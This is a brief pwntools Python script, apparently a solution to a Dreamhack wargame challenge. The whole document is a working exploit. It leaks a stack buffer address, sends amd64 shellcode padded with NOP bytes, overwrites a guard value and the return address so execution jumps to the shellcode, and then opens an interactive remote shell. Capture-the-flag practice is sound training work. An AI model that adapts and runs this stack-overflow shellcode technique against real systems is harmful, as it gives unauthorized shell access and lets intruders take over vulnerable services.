from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8708
r = remote(HOST, PORT)

r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', b'8731')

r.recvuntil(b'@ ')
buf = int(r.recvline().strip(),16)

sh=asm(shellcraft.sh())
payload=sh.ljust(76,b'\x90')
payload+=p32(0xdeadbeef)
payload+=p64(0)+p64(buf)

r.sendafter(b'> ', payload)

r.interactive()